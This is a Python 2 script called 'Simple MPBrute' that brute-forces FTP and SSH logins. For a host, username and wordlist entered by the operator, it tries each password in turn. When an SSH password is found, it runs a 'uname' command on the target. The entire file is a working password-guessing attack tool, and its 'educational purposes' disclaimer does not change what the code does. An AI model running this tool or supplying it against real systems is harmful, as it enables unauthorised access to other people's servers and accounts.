##############################################################
# This script was created only for educational purposes      #
# I don't take responsible for actions you do in illegal way #
# Tested and verified in Python 2.7.12                       #
# OS Verified : Kali Linux                                   #
# Made in Republic of Kosovo                                 #
##############################################################
import socket
import time
logo = ""
logo +="    __  __           _        _         _  __                          \n"
logo +="   |  \/  |         | |      (_)       | |/ /                          \n"
logo += "   | \  / | __ _  __| | ___   _ _ __   | ' / ___  ___  _____   _____  \n"
logo +="   | |\/| |/ _` |/ _` |/ _ \ | | '_ \  |  < / _ \/ __|/ _ \ \ / / _ \  \n"
logo +="   | |  | | (_| | (_| |  __/ | | | | | | . \ (_) \__ \ (_) \ V / (_) | \n"
logo +="   |_|  |_|\__,_|\__,_|\___| |_|_| |_| |_|\_\___/|___/\___/ \_/ \___/  \n\n"
print logo
print "                  #   Welcome to Simple MPBrute    #       "
print "                 ##  Write 1 for FTP - 2 for SSH   ##      "
print "                ###  Author: Florian Kunushevci    ###     "
def homeask1():
	homeask = raw_input("MPBrute../> ")
        if homeask == "1":
                ftp()
        elif homeask == "2":
                ssh()
        elif homeask == "3":
                telnet()
        else:
                print "[+] Error while typing! [+]"
		homeask1()
def ftp():
	host = raw_input("Type Host:../> ")
	wordlist = raw_input('Type wordlist file:../> ')
	username = raw_input("Type Username:../>")
	wordlist = open(wordlist)
	print ""
	for i in wordlist.readlines():
		password = i.strip("\n")
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, 21))
			data = s.recv(1024)
			time.sleep(0.5)
			s.send("USER " + username + "\r\n" . format(username))
			data = s.recv(1024)
			time.sleep(0.5)
			s.send("PASS " + password + "\r\n" . format(password))
			data = s.recv(1024)
			if "530" in data:
                                print "[+] Error not Cracked!: " + password + " [+]"
                        elif "230" in data:
                                print "[+] Cracked: " + password + " [+]"
                                break
			time.sleep(0.5)
		except socket.error, exc:
    			print "[+] Error :  %s [+]" % exc
def ssh():
	import paramiko
	print ""
	host = raw_input("Type Host:../> ")
	username = raw_input("Type Username:../> ")
	wordlist = raw_input('Type wordlist file:../> ')
	wordlist = open(wordlist)
	print ""
	for i in wordlist.readlines():
        	password = i.strip("\n")
        	try:
                	ssh = paramiko.SSHClient()
                	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                	ssh.connect(host, username=username, password=password)
                	time.sleep(1)
                	print "[+] Cracked : " + password + "[+]"
                	stdin,stdout,stderr = ssh.exec_command("uname -s -r -v")
                	for line in stdout.readlines():
                        	print line.strip()
                        	break
                	ssh.close()
        	except paramiko.AuthenticationException:
                	print "[+] Error not Cracked: " + password + " [+]"
        	except socket.error, exc:
                	print "[+] Error : %s [+]" % exc
                	break
def telnet():
	print "Under Construction - Telnet"
homeask1()
